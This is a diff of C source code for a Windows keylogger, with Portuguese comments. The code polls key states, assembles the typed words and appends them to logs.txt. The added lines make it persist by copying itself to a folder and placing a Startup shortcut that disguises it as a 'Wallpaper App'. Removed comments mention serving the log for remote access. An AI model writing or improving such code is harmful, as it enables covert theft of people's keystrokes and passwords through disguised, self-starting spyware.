@@ -1,9 +1,12 @@
-#include <stdio.h>
 #include <windows.h>
+#include <shlobj.h>
+#include <shobjidl.h>
+#include <objbase.h>
+#include <wchar.h>
+#include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdbool.h>
-#include <shlobj.h>
 #include <ctype.h>
 
 bool valPersis();
@@ -11,7 +14,6 @@ bool valPersis();
 int main()
 {
     FILE *fptr;
-
     char palavra[100];
     int count = 0;
 
@@ -23,17 +25,12 @@ int main()
             {
                 if (GetAsyncKeyState(vk) & 0x01)
                 {
-                    // Mapeia o código virtual para scan code
                     UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
-
-                    // Monta o valor lParam como se viesse de uma mensagem WM_KEYDOWN
                     LONG lParam = (scanCode << 16);
-
-                    // Buffer para o nome da tecla
                     char keyName[128];
+
                     if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
                     {
-
                         // Backspace
                         if (vk == VK_BACK)
                         {
@@ -47,20 +44,18 @@ int main()
                             continue;
                         }
 
-                        // Enter ou espaço, salva o arquivo
+                        // Enter ou espaço
                         if (vk == VK_RETURN || vk == VK_SPACE)
                         {
                             if (count > 0)
                             {
-
-                                // Finalizando o arquivo log txt
                                 palavra[count] = '\0';
-
-                                // Salavando arquivo
                                 fptr = fopen("logs.txt", "a");
-                                fprintf(fptr, "%s\n", palavra);
-                                fclose(fptr);
-
+                                if (fptr)
+                                {
+                                    fprintf(fptr, "%s\n", palavra);
+                                    fclose(fptr);
+                                }
                                 count = 0;
                                 palavra[0] = '\0';
                                 system("cls");
@@ -68,31 +63,25 @@ int main()
                             continue;
                         }
 
-                        //  Salvando as teclas e montando a palavra
-                        bool shiftPressed = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) || ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+                        // Letras e números
+                        bool shiftPressed = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) ||
+                                            ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
                         if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z') || (vk >= 'a' && vk <= 'z'))
                         {
                             if (count < sizeof(palavra) - 1)
                             {
                                 char c = (char)vk;
-
                                 if (!shiftPressed)
-                                {
                                     c = tolower(c);
-                                }
-
                                 palavra[count++] = c;
                                 palavra[count] = '\0';
                             }
                         }
                         system("cls");
                         printf("%s", palavra);
-
-                        // if (scanCode == VK_ESCAPE) return 0;
                     }
                 }
             }
-
             Sleep(30);
         }
     }
@@ -103,53 +92,80 @@ int main()
 bool valPersis()
 {
     FILE *varsConf;
-    char chave[50];
+    char linha[50];
     int valor = 0;
 
     varsConf = fopen("config.cfg", "r");
-    
+
     if (!varsConf)
     {
+        // Configuração inicial
         char currentPath[MAX_PATH];
-        char startupPath[MAX_PATH];
-        char newPath[MAX_PATH];
+        char rootPath[MAX_PATH] = "C:\\MyWallpaperFolder";
+        char exePath[MAX_PATH];
+        char shortcutPath[MAX_PATH];
+        char configPath[MAX_PATH];
 
         GetModuleFileName(NULL, currentPath, MAX_PATH);
+        CreateDirectory(rootPath, NULL);
 
-        fclose(varsConf);
-        varsConf = fopen("config.cfg", "w");
-        fprintf(varsConf, "pos=1\n");
-        fclose(varsConf);
+        snprintf(exePath, MAX_PATH, "%s\\main.exe", rootPath);
+        CopyFile(currentPath, exePath, FALSE);
 
-        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
+        snprintf(configPath, MAX_PATH, "%s\\config.cfg", rootPath);
+        varsConf = fopen(configPath, "w");
+        if (varsConf)
         {
-            snprintf(newPath, MAX_PATH, "%s\\main.exe", startupPath);
-            if (strcmp(currentPath, newPath) != 0)
-            {
-                CopyFile(currentPath, newPath, FALSE);
-            }
-
-            snprintf(currentPath, MAX_PATH, "%s\\config.cfg", startupPath);
-            MoveFile("config.cfg", currentPath);
+            fprintf(varsConf, "pos=1\n");
+            fclose(varsConf);
         }
-        return false; // primeira execução
+
+        char startupFolder[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolder)))
+        {
+            snprintf(shortcutPath, MAX_PATH, "%s\\WallpaperShortcut.lnk", startupFolder);
+
+            CoInitialize(NULL);
+            IShellLinkA *psl = NULL;
+            HRESULT hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
+                                            &IID_IShellLinkA, (void **)&psl);
+
+            if (SUCCEEDED(hres) && psl)
+            {
+                // Chamadas corretas via lpVtbl
+                psl->lpVtbl->SetPath(psl, exePath);
+                psl->lpVtbl->SetDescription(psl, "Wallpaper App");
+
+                IPersistFile *ppf = NULL;
+                hres = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void **)&ppf);
+                if (SUCCEEDED(hres) && ppf)
+                {
+                    WCHAR wShortcut[MAX_PATH];
+                    MultiByteToWideChar(CP_ACP, 0, shortcutPath, -1, wShortcut, MAX_PATH);
+                    ppf->lpVtbl->Save(ppf, wShortcut, TRUE);
+                    ppf->lpVtbl->Release(ppf);
+                }
+
+                psl->lpVtbl->Release(psl);
+            }
+            CoUninitialize();
+        }
+
+        return false;
     }
     else
     {
         // Ler config.cfg
-        if (fscanf(varsConf, "%[^=]=%d", chave, &valor) == 2)
+        if (fgets(linha, sizeof(linha), varsConf))
         {
-            fclose(varsConf);
-            if (valor == 1)
+            if (sscanf(linha, "pos=%d", &valor) == 1)
             {
-                return true;
+                fclose(varsConf);
+                return valor == 1;
             }
         }
+        fclose(varsConf);
     }
 
     return false;
 }
-
-// Servir esse arquivo de log abrindo um caminho para acesso remoto ou compartilhando esse arquivo localmente
-// shell:startup
-// ao inves de ter que criar dois arquivos vou fazer um arquivo config onde vai ser salvo se o arquivo ja foi copiado ou nao
